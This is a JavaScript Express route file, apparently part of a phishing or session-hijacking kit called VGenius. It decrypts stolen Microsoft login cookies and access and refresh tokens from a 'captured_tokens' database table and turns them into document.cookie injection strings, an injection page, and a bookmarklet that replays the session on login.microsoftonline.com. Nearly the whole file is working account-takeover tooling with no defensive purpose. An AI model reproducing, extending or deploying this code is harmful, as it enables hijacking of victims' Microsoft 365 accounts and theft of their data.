/**
 * VGenius C Engine - Cookie Injection Routes
 * Uses competitor's proven method: load Microsoft page, inject cookies, redirect
 */
const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// ─── Cookie Injection Page ──────────────────────────────────────
router.get('/page/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).send('No tokens available');
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    if (cookiesList.length === 0) return res.status(400).send('No cookies available');

    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    var tenant = token.tenant || config.AZURE_TENANT || 'common';

    res.type('html').send(generateInjectPage(cookiesList, clientId, tenant));
  } catch (err) {
    console.error('[CookieInject] Page error:', err);
    res.status(500).send('Server error');
  }
});

// ─── Direct Cookie String API ──────────────────────────────────────
router.get('/raw/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    var cookieString = [];
    for (var i = 0; i < cookiesList.length; i++) {
      const c = cookiesList[i];
      cookieString.push(`document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";`);
    }

    res.json({
      success: true,
      cookie_string: cookieString.join(''),
      cookie_count: cookiesList.length,
      cookies: cookiesList
    });
  } catch (err) {
    console.error('[CookieInject] Raw error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Parse Cookie String ───────────────────────────────────────────
function parseCookies(cookieString) {
  if (!cookieString) return [];

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower.startsWith('samesite=')) {
        continue;
      }
      if (!value || value.length === 0) continue;

      seenNames[nameLower] = {
        name: name,
        value: value,
        domain: '.login.microsoftonline.com'
      };
    }
  }

  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Generate Cookie Injection Page ────────────────────────────────
// Uses our proven method:
// 1. Open Microsoft login page
// 2. Inject cookies via document.cookie
// 3. Redirect to auth page
function generateInjectPage(cookies, clientId, tenant) {
  var cookieJson = JSON.stringify(cookies);

  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += '  <meta charset="UTF-8">\n';
  html += '  <title>VGenius Cookie Injector</title>\n';
  html += '  <style>\n';
  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #0a0a1a; color: #e0e0e0; }\n';
  html += '    button { padding: 12px 24px; cursor: pointer; background: #00ccff; color: #000; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; margin: 10px 5px; }\n';
  html += '    button:hover { background: #00aacc; }\n';
  html += '    .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
  html += '    .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
  html += '  </style>\n';
  html += '</head>\n<body>\n';
  html += '  <h1 style="color:#00ccff">VGenius Cookie Injector</h1>\n';
  html += '  <p>Click the button below to inject cookies and login.</p>\n';
  html += '  <button onclick="startInjection()">Inject Cookies & Login</button>\n';
  html += '  <div id="status"></div>\n';
  html += '  <script>\n';
  html += '    function startInjection() {\n';
  html += '      setStatus("Opening Microsoft login page...", "info");\n';
  html += '      window.location.href = "https://login.microsoftonline.com/' + tenant + '/";\n';
  html += '    }\n';
  html += '    function setStatus(msg, type) {\n';
  html += '      document.getElementById("status").className = "status " + type;\n';
  html += '      document.getElementById("status").innerHTML = msg;\n';
  html += '    }\n';
  html += '  </script>\n';
  html += '</body>\n</html>';

  return html;
}

// ─── Bookmarklet Generator ─────────────────────────────────────────
// Generates a bookmarklet that user can click on Microsoft login page
router.get('/bookmarklet/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    if (cookiesList.length === 0) return res.status(400).json({ error: 'No cookies available' });

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

    // Build bookmarklet code using document.cookie method 
    var bookmarklet = '';
    for (var i = 0; i < cookiesList.length; i++) {
      const c = cookiesList[i];
      bookmarklet += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
    }
    bookmarklet += '\n';
    bookmarklet += '// Redirect after 3s\n';
    bookmarklet += 'setTimeout(() => {\n';
    bookmarklet += '  window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
    bookmarklet += '}, 3000);\n';

    res.json({ bookmarklet: bookmarklet, cookies: cookiesList });
  } catch (err) {
    console.error('[CookieInject] Bookmarklet error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
